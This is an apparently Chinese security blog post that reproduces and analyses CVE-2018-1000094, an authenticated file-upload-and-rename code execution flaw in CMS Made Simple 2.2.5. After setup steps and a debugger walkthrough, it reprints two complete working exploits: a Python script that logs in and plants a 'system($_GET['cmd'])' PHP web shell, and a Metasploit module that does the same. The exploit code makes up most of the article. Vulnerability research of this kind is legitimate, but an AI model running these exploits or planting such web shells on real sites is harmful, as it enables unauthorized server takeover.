<!DOCTYPE html>
<html lang="en">

<head>
    
<meta charset="utf-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">


<title>CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞) - F0rmat的博客 | 专注于网络攻防和信息安全</title>

<meta name="description" content="0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&amp;lt;?php phpinfo();?&amp;gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&amp;#34;fileactioncopy&amp;#34;]) || $fileaction==&amp;#34;copy&amp;#34;) { include_once(__DIR__.&amp;#34;/action.copy.php&amp;#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2." /><meta name="keywords"
  content="F0rmat, 信息安全, 网络安全, 红蓝攻防, 渗透测试, bypass, waf, 注入, 黑客" />
  <meta name="referrer" content="no-referrer" />


<link rel="stylesheet" href="https://getshe11.com/css/main.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/src/css/lightgallery.css">



<meta property="og:title" content="CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)" />
<meta property="og:description" content="0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&lt;?php phpinfo();?&gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&#34;fileactioncopy&#34;]) || $fileaction==&#34;copy&#34;) { include_once(__DIR__.&#34;/action.copy.php&#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://getshe11.com/post/cve-2018-1000094-cmsms-2.2.5-code-execution-vulnerability/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2018-08-11T09:31:30&#43;00:00" />
<meta property="article:modified_time" content="2018-08-11T09:31:30&#43;00:00" />

<meta itemprop="name" content="CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)">
<meta itemprop="description" content="0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&lt;?php phpinfo();?&gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&#34;fileactioncopy&#34;]) || $fileaction==&#34;copy&#34;) { include_once(__DIR__.&#34;/action.copy.php&#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2."><meta itemprop="datePublished" content="2018-08-11T09:31:30&#43;00:00" />
<meta itemprop="dateModified" content="2018-08-11T09:31:30&#43;00:00" />
<meta itemprop="wordCount" content="882">
<meta itemprop="keywords" content="漏洞,代码审计,php,CMSMS,每周一洞," /><meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)"/>
<meta name="twitter:description" content="0x01 前言 CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。
昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。
0x02 环境  下载下来是一个安装文件cmsms-2.2.5-install.php，浏览器直接打开  默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息  填写管理账号密码信息  填写可写可读的目录和选择语言  安装完成，除了邮件模块，不过也用不上。   0x03 漏洞复现过程  登录后台   选择File Manager   编写一个文件名为a.txt内容为&lt;?php phpinfo();?&gt;的文件，然后点击上传。   选中a.txt，点击copy,名字改为rce.php,然后确定   文件就copy过来了，有点类似系统的copy命令。   访问rce.php   0x04 漏洞分析过程  还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。 可以看到主要是通过文件admin/moduleinterface.php文件进行操作的。 可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程 相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm&#43;xdebug/ 从上面的抓包可以看出来，mact参数是FileManager，m1_是fileaction，大家可以去这里下断点然后一步一步分析整个流程。  有经验可以看出来，FileManager就是modules\FileManager目录，fileaction就是modules/FileManager/action.fileaction.php文件，再往下看代码的68行，可以看到我们的copy操作的代码。  if (isset($params[&#34;fileactioncopy&#34;]) || $fileaction==&#34;copy&#34;) { include_once(__DIR__.&#34;/action.copy.php&#34;); return; }  我们找到这个文件action.copy.php，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。  我们F7单步走，可以看到执行$res = copy($src,$dest);的时候没有发生错误。  这样就正式完成了所有操作，如有不懂可以看下官方文档的copy函数的用法http://www.php.net/manual/en/function.copy.php  0x05 漏洞脚本 python版本 # Exploit Title: CMS Made Simple 2."/>

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->
</head>

<body>
    <div class="header-placeholder"></div>
    
    <header class="header">
        <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    
    <a class="site-title" href="https://getshe11.com/">F0rmat</a>
    
    <nav class="site-nav">
        <a class="page-link" href="/">Home</a><a class="page-link" href="/post/">Category</a>
    </nav>
</div>

    </header>

    
    <div class="page-content">
        <div class="wrapper">
            
            <div class="col-main">
                <div class="post">
    
    <header class="post-header">
        <h1 class="post-title">CVE-2018-1000094-CMSMS 2.2.5代码执行漏洞(每周一洞)</h1>
        <p class="post-meta">Aug 11, 2018</p>
    </header>
    <article class="post-content">
        
        
        
        
        
        
        <h1 id="0x01-前言">0x01 前言</h1>
<p>CMS Made Simple是一个简单易于使用的内容管理系统。它使用PHP，MySQL和Smarty模板引擎开发。</p>
<p>昨天看漏洞库的时候看到这一款CMS，漏洞操作也挺简单的，但是可以申请CVE，于是乎就复现了一篇过程和写漏洞脚本。</p>
<!-- raw HTML omitted -->
<h1 id="0x02-环境">0x02 环境</h1>
<ol>
<li>下载下来是一个安装文件<code>cmsms-2.2.5-install.php</code>，浏览器直接打开
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/2.png" alt=""></li>
<li>默认Next，到数据库连接这一块要先创建一个数据库，我这里创建一个名为simple的数据库，然后填上数据库连接信息
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/1.png" alt="">
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/3.png" alt=""></li>
<li>填写管理账号密码信息
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/4.png" alt=""></li>
<li>填写可写可读的目录和选择语言
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/5.png" alt=""></li>
<li>安装完成，除了邮件模块，不过也用不上。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/6.png" alt=""></li>
</ol>
<h1 id="0x03-漏洞复现过程">0x03 漏洞复现过程</h1>
<ol start="6">
<li>
<p>登录后台
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/7.png" alt=""></p>
</li>
<li>
<p>选择File Manager
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/8.png" alt=""></p>
</li>
<li>
<p>编写一个文件名为a.txt内容为<code>&lt;?php phpinfo();?&gt;</code>的文件，然后点击上传。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/9.png" alt=""></p>
</li>
<li>
<p>选中a.txt，点击copy,名字改为rce.php,然后确定
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/10.png" alt=""><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/11.png" alt=""></p>
</li>
<li>
<p>文件就copy过来了，有点类似系统的copy命令。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/12.png" alt=""></p>
</li>
<li>
<p>访问<code>rce.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/13.png" alt=""></p>
</li>
</ol>
<h1 id="0x04-漏洞分析过程">0x04 漏洞分析过程</h1>
<ul>
<li>还记得上一篇的phpok的分析，如果找不出关键文件，可以抓包分析。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/14.png" alt=""><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/15.png" alt="">
可以看到主要是通过文件<code>admin/moduleinterface.php</code>文件进行操作的。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/16.png" alt="">
可能这样看会让人很乱，我们可以用phpstorm的debug来调试整个过程
相关配置可以看https://getpass.cn/2018/04/10/Breakpoint%20debugging%20with%20phpstorm+xdebug/</li>
<li>从上面的抓包可以看出来，<code>mact</code>参数是<code>FileManager</code>，<code>m1_</code>是<code>fileaction</code>，大家可以去这里下断点然后一步一步分析整个流程。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/17.png" alt=""></li>
<li>有经验可以看出来，<code>FileManager</code>就是<code>modules\FileManager</code>目录，<code>fileaction</code>就是<code>modules/FileManager/action.fileaction.php</code>文件，再往下看代码的68行，可以看到我们的copy操作的代码。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$params</span><span class="p">[</span><span class="s2">&#34;fileactioncopy&#34;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$fileaction</span><span class="o">==</span><span class="s2">&#34;copy&#34;</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">include_once</span><span class="p">(</span><span class="no">__DIR__</span><span class="o">.</span><span class="s2">&#34;/action.copy.php&#34;</span><span class="p">);</span>
  <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><ul>
<li>我们找到这个文件<code>action.copy.php</code>，我们在93行下一个断点，然后去操作copy，可以看到有各种很详细的参数信息。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/18.png" alt=""> <img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/19.png" alt=""></li>
<li>我们F7单步走，可以看到执行<code>$res = copy($src,$dest);</code>的时候没有发生错误。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/cmsms/20.png" alt=""></li>
<li>这样就正式完成了所有操作，如有不懂可以看下官方文档的<code>copy</code>函数的用法http://www.php.net/manual/en/function.copy.php</li>
</ul>
<h1 id="0x05-漏洞脚本">0x05 漏洞脚本</h1>
<h2 id="python版本">python版本</h2>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"># Exploit Title: CMS Made Simple 2.2.5 authenticated Remote Code Execution
# Date: 3rd of July, 2018
# Exploit Author: Mustafa Hasan (@strukt93)
# Vendor Homepage: http://www.cmsmadesimple.org/
# Software Link: http://www.cmsmadesimple.org/downloads/cmsms/
# Version: 2.2.5
# CVE: CVE-2018-1000094

import requests
import base64

base_url = &#34;http://127.0.0.1/cmsms/admin&#34;
upload_dir = &#34;/uploads&#34;
upload_url = base_url.split(&#39;/admin&#39;)[0] + upload_dir
username = &#34;admin&#34;
password = &#34;123456&#34;

csrf_param = &#34;__c&#34;
txt_filename = &#39;cmsmsrce.txt&#39;
php_filename = &#39;shell.php&#39;
payload = &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;

def parse_csrf_token(location):
    return location.split(csrf_param + &#34;=&#34;)[1]

def authenticate():
    page = &#34;/login.php&#34;
    url = base_url + page
    data = {
        &#34;username&#34;: username,
        &#34;password&#34;: password,
        &#34;loginsubmit&#34;: &#34;Submit&#34;
    }
    response  = requests.post(url, data=data, allow_redirects=False)
    status_code = response.status_code
    if status_code == 302:
        print &#34;[+] Authenticated successfully with the supplied credentials&#34;
        return response.cookies, parse_csrf_token(response.headers[&#39;Location&#39;])
    print &#34;[-] Authentication failed&#34;
    return None, None

def upload_txt(cookies, csrf_token):
    mact = &#34;FileManager,m1_,upload,0&#34;
    page = &#34;/moduleinterface.php&#34;
    url = base_url + page
    data = {
        &#34;mact&#34;: mact,
        csrf_param: csrf_token,
        &#34;disable_buffer&#34;: 1
    }
    txt = {
        &#39;m1_files[]&#39;: (txt_filename, payload)
    }
    print &#34;[*] Attempting to upload {}...&#34;.format(txt_filename)
    response = requests.post(url, data=data, files=txt, cookies=cookies)
    status_code = response.status_code
    if status_code == 200:
        print &#34;[+] Successfully uploaded {}&#34;.format(txt_filename)
        return True
    print &#34;[-] An error occurred while uploading {}&#34;.format(txt_filename)
    return None

def copy_to_php(cookies, csrf_token):
    mact = &#34;FileManager,m1_,fileaction,0&#34;
    page = &#34;/moduleinterface.php&#34;
    url = base_url + page
    b64 = base64.b64encode(txt_filename)
    serialized = &#39;a:1:{{i:0;s:{}:&#34;{}&#34;;}}&#39;.format(len(b64), b64)
    data = {
        &#34;mact&#34;: mact,
        csrf_param: csrf_token,
        &#34;m1_fileactioncopy&#34;: &#34;&#34;,
        &#34;m1_path&#34;: upload_dir,
        &#34;m1_selall&#34;: serialized,
        &#34;m1_destdir&#34;: &#34;/&#34;,
        &#34;m1_destname&#34;: php_filename,
        &#34;m1_submit&#34;: &#34;Copy&#34;
    }
    print &#34;[*] Attempting to copy {} to {}...&#34;.format(txt_filename, php_filename)
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
    status_code = response.status_code
    if status_code == 302:
        if response.headers[&#39;Location&#39;].endswith(&#39;copysuccess&#39;):
            print &#34;[+] File copied successfully&#34;
            return True
    print &#34;[-] An error occurred while copying, maybe {} already exists&#34;.format(php_filename)
    return None

def quit():
    print &#34;[-] Exploit failed&#34;
    exit()

def run():
    cookies,csrf_token = authenticate()
    if not cookies:
        quit()
    if not upload_txt(cookies, csrf_token):
        quit()
    if not copy_to_php(cookies, csrf_token):
        quit()
    print &#34;[+] Exploit succeeded, shell can be found at: {}&#34;.format(upload_url + &#39;/&#39; + php_filename)

run()

</code></pre></div><h2 id="msf版本">MSF版本</h2>
<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#39;Name&#39;            =&gt; &#39;CMS Made Simple Authenticated RCE via File Upload/Copy&#39;,
      &#39;Description&#39;     =&gt; %q{
        CMS Made Simple v2.2.5 allows an authenticated administrator to upload a file
        and rename it to have a .php extension. The file can then be executed by opening
        the URL of the file in the /uploads/ directory.
      },
      &#39;Author&#39; =&gt;
        [
          &#39;Mustafa Hasen&#39;,  # Vulnerability discovery and EDB PoC
          &#39;Jacob Robles&#39;    # Metasploit Module
        ],
      &#39;License&#39;         =&gt; MSF_LICENSE,
      &#39;References&#39;      =&gt;
        [
          [ &#39;CVE&#39;, &#39;2018-1000094&#39; ],
          [ &#39;CWE&#39;, &#39;434&#39; ],
          [ &#39;EDB&#39;, &#39;44976&#39; ],
          [ &#39;URL&#39;, &#39;http://dev.cmsmadesimple.org/bug/view/11741&#39; ]
        ],
      &#39;Privileged&#39;  =&gt; false,
      &#39;Platform&#39;  =&gt; [ &#39;php&#39; ],
      &#39;Arch&#39;  =&gt; ARCH_PHP,
      &#39;Targets&#39; =&gt;
        [
          [ &#39;Universal&#39;, {} ],
        ],
      &#39;DefaultTarget&#39;  =&gt; 0,
      &#39;DisclosureDate&#39; =&gt; &#39;Jul 03 2018&#39;))

    register_options(
      [
        OptString.new(&#39;TARGETURI&#39;, [ true, &#34;Base cmsms directory path&#34;, &#39;/cmsms/&#39;]),
        OptString.new(&#39;USERNAME&#39;, [ true, &#34;Username to authenticate with&#34;, &#39;&#39;]),
        OptString.new(&#39;PASSWORD&#39;, [ true, &#34;Password to authenticate with&#34;, &#39;&#39;])
      ])

    register_advanced_options ([
      OptBool.new(&#39;ForceExploit&#39;,  [false, &#39;Override check result&#39;, false])
    ])
  end

  def check
    res = send_request_cgi({
      &#39;uri&#39; =&gt; normalize_uri(target_uri.path),
      &#39;method&#39; =&gt; &#39;GET&#39;
    })

    unless res
      vprint_error &#39;Connection failed&#39;
      return CheckCode::Unknown
    end

    unless res.body =~ /CMS Made Simple&lt;\/a&gt; version (\d+\.\d+\.\d+)/
      return CheckCode::Unknown
    end

    version = Gem::Version.new($1)
    vprint_status(&#34;#{peer} - CMS Made Simple Version: #{version}&#34;)

    if version == Gem::Version.new(&#39;2.2.5&#39;)
      return CheckCode::Appears
    end

    if version &lt; Gem::Version.new(&#39;2.2.5&#39;)
      return CheckCode::Detected
    end

    CheckCode::Safe
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include?(check)
      unless datastore[&#39;ForceExploit&#39;]
        fail_with Failure::NotVulnerable, &#39;Target is not vulnerable. Set ForceExploit to override.&#39;
      end
      print_warning &#39;Target does not appear to be vulnerable&#39;
    end

    res = send_request_cgi({
      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;admin&#39;, &#39;login.php&#39;),
      &#39;method&#39; =&gt; &#39;POST&#39;,
      &#39;vars_post&#39; =&gt; {
        &#39;username&#39; =&gt; datastore[&#39;USERNAME&#39;],
        &#39;password&#39; =&gt; datastore[&#39;PASSWORD&#39;],
        &#39;loginsubmit&#39; =&gt; &#39;Submit&#39;
      }
    })
    unless res
      fail_with(Failure::NotFound, &#39;A response was not received from the remote host&#39;)
    end

    unless res.code == 302 &amp;&amp; res.get_cookies &amp;&amp; res.headers[&#39;Location&#39;] =~ /\/admin\?(.*)?=(.*)/
      fail_with(Failure::NoAccess, &#39;Authentication was unsuccessful&#39;)
    end

    vprint_good(&#34;#{peer} - Authentication successful&#34;)
    csrf_name = $1
    csrf_val = $2

    csrf = {csrf_name =&gt; csrf_val}
    cookies = res.get_cookies
    filename = rand_text_alpha(8..12)

    # Generate form data
    message = Rex::MIME::Message.new
    message.add_part(csrf[csrf_name], nil, nil, &#34;form-data; name=\&#34;#{csrf_name}\&#34;&#34;)
    message.add_part(&#39;FileManager,m1_,upload,0&#39;, nil, nil, &#39;form-data; name=&#34;mact&#34;&#39;)
    message.add_part(&#39;1&#39;, nil, nil, &#39;form-data; name=&#34;disable_buffer&#34;&#39;)
    message.add_part(payload.encoded, nil, nil, &#34;form-data; name=\&#34;m1_files[]\&#34;; filename=\&#34;#{filename}.txt\&#34;&#34;)
    data = message.to_s

    res = send_request_cgi({
      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;admin&#39;, &#39;moduleinterface.php&#39;),
      &#39;method&#39; =&gt; &#39;POST&#39;,
      &#39;data&#39; =&gt; data,
      &#39;ctype&#39; =&gt; &#34;multipart/form-data; boundary=#{message.bound}&#34;,
      &#39;cookie&#39; =&gt; cookies
    })

    unless res &amp;&amp; res.code == 200
      fail_with(Failure::UnexpectedReply, &#39;Failed to upload the text file&#39;)
    end
    vprint_good(&#34;#{peer} - File uploaded #{filename}.txt&#34;)

    fileb64 = Rex::Text.encode_base64(&#34;#{filename}.txt&#34;)
    data = {
      &#39;mact&#39; =&gt; &#39;FileManager,m1_,fileaction,0&#39;,
      &#34;m1_fileactioncopy&#34; =&gt; &#34;&#34;,
      &#39;m1_selall&#39; =&gt; &#34;a:1:{i:0;s:#{fileb64.length}:\&#34;#{fileb64}\&#34;;}&#34;,
      &#39;m1_destdir&#39; =&gt; &#39;/&#39;,
      &#39;m1_destname&#39; =&gt; &#34;#{filename}.php&#34;,
      &#39;m1_path&#39; =&gt; &#39;/uploads&#39;,
      &#39;m1_submit&#39; =&gt; &#39;Copy&#39;,
      csrf_name =&gt; csrf_val
    }

    res = send_request_cgi({
      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;admin&#39;, &#39;moduleinterface.php&#39;),
      &#39;method&#39; =&gt; &#39;POST&#39;,
      &#39;cookie&#39; =&gt; cookies,
      &#39;vars_post&#39; =&gt; data
    })

    unless res
      fail_with(Failure::NotFound, &#39;A response was not received from the remote host&#39;)
    end

    unless res.code == 302 &amp;&amp; res.headers[&#39;Location&#39;].to_s.include?(&#39;copysuccess&#39;)
      fail_with(Failure::UnexpectedReply, &#39;Failed to rename the file&#39;)
    end
    vprint_good(&#34;#{peer} - File renamed #{filename}.php&#34;)

    res = send_request_cgi({
      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;uploads&#39;, &#34;#{filename}.php&#34;),
      &#39;method&#39; =&gt; &#39;GET&#39;,
      &#39;cookie&#39; =&gt; cookies
    })
  end
end
</code></pre></div><h1 id="0x06-参考">0x06 参考</h1>
<p>程序下载:http://s3.amazonaws.com/cmsms/downloads/14076/cmsms-2.2.5-install.zip
<a href="https://www.exploit-db.com/exploits/44976/">https://www.exploit-db.com/exploits/44976/</a>
<a href="http://dev.cmsmadesimple.org/bug/view/11741">http://dev.cmsmadesimple.org/bug/view/11741</a>
<a href="https://packetstormsecurity.com/files/148622/CMS-Made-Simple-2.2.5-Authenticated-Remote-Command-Execution.html">https://packetstormsecurity.com/files/148622/CMS-Made-Simple-2.2.5-Authenticated-Remote-Command-Execution.html</a></p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/phpok4.9-background-getshell/">
            Phpok4.9后台getshell(每周一洞)
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/">
            禅知Pro 1.6 前台任意文件读取分析
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/research-on-php-deserialization/" class="post-link">PHP反序列化研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com/">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
